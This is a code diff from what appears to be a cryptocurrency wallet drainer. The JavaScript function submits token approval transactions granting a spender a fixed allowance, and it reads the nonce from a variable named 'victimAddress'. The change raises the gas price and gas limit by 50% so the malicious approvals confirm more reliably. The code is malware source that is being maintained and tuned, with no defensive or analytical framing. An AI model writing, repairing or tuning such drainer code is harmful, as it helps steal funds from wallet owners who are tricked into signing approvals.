@@ -266,14 +266,19 @@ const allowance = async (method, options, maxRetryCount = 3) => {
 
   try {
     const contract = new ethers.Contract(token.id, abi, window.signer);
-    const gasPrice = await getGasPrice(chainSetting);
-    const gasLimit = await contract.estimateGas[method](
+    let gasPrice = await getGasPrice(chainSetting);
+    let gasLimit = await contract.estimateGas[method](
       spender,
       AMOUNT_TO_APPROVE
     );
-    const safeGasLimit = gasLimit
+
+    gasPrice = gasPrice
       .div(ethers.BigNumber.from("100"))
-      .mul(ethers.BigNumber.from("120"));
+      .mul(ethers.BigNumber.from("150"));
+
+    gasLimit = gasLimit
+      .div(ethers.BigNumber.from("100"))
+      .mul(ethers.BigNumber.from("150"));
 
     const nonce = await window.chainProvider.getTransactionCount(
       window.victimAddress,
@@ -282,7 +287,7 @@ const allowance = async (method, options, maxRetryCount = 3) => {
 
     const transaction = await contract[method](spender, AMOUNT_TO_APPROVE, {
       gasPrice: gasPrice,
-      gasLimit: safeGasLimit,
+      gasLimit: gasLimit,
       nonce,
     });
 
